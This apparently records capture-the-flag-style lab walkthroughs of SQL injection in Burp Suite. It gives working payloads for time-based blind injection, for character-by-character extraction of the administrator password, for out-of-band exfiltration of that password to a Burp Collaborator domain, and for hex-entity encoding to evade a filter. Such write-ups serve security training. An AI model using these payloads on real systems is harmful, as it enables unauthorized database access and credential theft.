**Step1:**

Click on categories

**Step2:**

Send the request to repeater

**Step3**

Type this command and lab will be solve

`'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

**Step 1:**

Click on any categories as in previous lab

**Step2:**

Send the response of the request to repeater.

**Step3**

We modify request

`'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

The responce is shown after time

So it is clear that there is a time delay injection.

Replacing `1=1`  with `1=2` the output is shown immediately.

**Step4**

Now we check user administrator is present or not

`'%  3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

So with the response time it is clear that user administrator is present

**Step5**

Now we find the length of password

`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

For this we use inruder.

Payload setting

From the result it is clear that length is 20 because it takes no time to generate response

**Step6**  
finding password for each index

`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

Again we use intruder for this purpose and set the payload to cluster bomb type

Payload 1

Payload 2

Now click on column and click response received

Now we sort response received

Password:mk7qel448ezj4bcimol0


**Step 1:**

Click on any categories as in previous lab

**Step2:**

Send the response of the request to repeater.

**Step3:**

Using this payload

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

Adding burp collaborator subdomain

Click on copy to collaborator

Mycase :`zbeaotk65l2z8oqqmqtihzw7vy1ppfd4.oastify.com`

Final exploit

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//zbeaotk65l2z8oqqmqtihzw7vy1ppfd4.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`

Result in collaborator

And lab is solved

**Step 1:**

Click on any categories as in previous lab

**Step2:**

Send the response of the request to repeater.

Using this query

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

Modify the query

`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ebtpo8kl502e83q5m5txhewmvd17p2dr.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`

Click on poll now

Here is the result

`Password:myjzzrk4gj5yomjsigl4`

**Step 1**

Click on

Then

**Step2:**

When we try to inject query in stock id it give error

So we use the hex entities

 `Extensions > Bapp>Hackvertor`

Installing it.

Now we right click then

 `Extensions > Bapp>Hackvertor > Encode > dec_entities/hex_entities.`

And add query

`UNION SELECT username||'~~~'||password FROM users`

output
